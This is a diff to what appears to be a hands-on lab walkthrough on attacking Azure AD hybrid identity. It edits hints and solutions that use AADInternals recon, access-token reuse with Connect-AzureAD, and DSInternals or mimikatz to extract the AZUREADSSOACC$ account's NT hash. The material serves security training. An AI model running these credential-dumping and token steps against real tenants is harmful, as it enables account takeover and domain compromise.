@@ -20,7 +20,8 @@ Hint: use https://aadinternals.com/aadinternals
 <summary><b>Solution</b></summary>
 
 ```powershell
-Import-Module AADInternals
+Install-Module -Name "AADInternals" -RequiredVersion "0.9.4" -Force
+Import-Module -Name "AADInternals" -RequiredVersion "0.9.4"
 Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
 ```
 </details>
@@ -73,8 +74,12 @@ Go the advanced way (and learn how to use access tokens):
 <summary><b>Hint 3</b></summary>
 
 Advanced way commands:
-1. ```Get-AADIntAccessTokenForAADGraph```
-1. ```Connect-AzureAD -AccountId $SyncUserUPN -TenantId $tenantId -AadAccessToken $at```
+
+```powershell
+$tenantId = "YOUR_TENANT_ID"
+$at = Get-AADIntAccessTokenForAADGraph
+Connect-AzureAD -AccountId $SyncUserUPN -TenantId $tenantId -AadAccessToken $at
+```
 
 if you went the easy way - figure it out yourself.
 </details>
@@ -119,7 +124,7 @@ $onpremSyncedUsers | ForEach-Object {
 } | Format-Table -Wrap -AutoSize
 ```
 
-Did you find it? should be ```user1 & user2```.
+Did you find it? should be ```user2```.
 </details>
 
 
@@ -181,6 +186,7 @@ $domain = "MYDOMAIN" # change to your domain name WITHOUT the ".onmicrosoft.com"
 #### 1. Get AZUREADSSOACC computer account's hash:
 ```powershell
 # Option 1: Get-ADReplAccount
+Import-Module DSInternals
 Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain $domain -Server dcvm # take the "NTHash" part
 
 # Option 2: mimikatz
